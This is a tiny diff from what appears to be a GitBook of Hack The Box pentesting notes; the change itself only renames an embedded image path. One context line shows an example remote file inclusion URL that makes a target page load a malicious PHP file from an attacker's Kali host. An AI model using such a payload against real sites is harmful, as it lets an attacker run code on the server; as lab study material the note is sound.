@@ -81,4 +81,4 @@ Example:
 
 http://htb.local/?page=http://\<kali_IP:8000>/maliciou_s\_file.php
 
-<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (7).png" alt=""><figcaption></figcaption></figure>
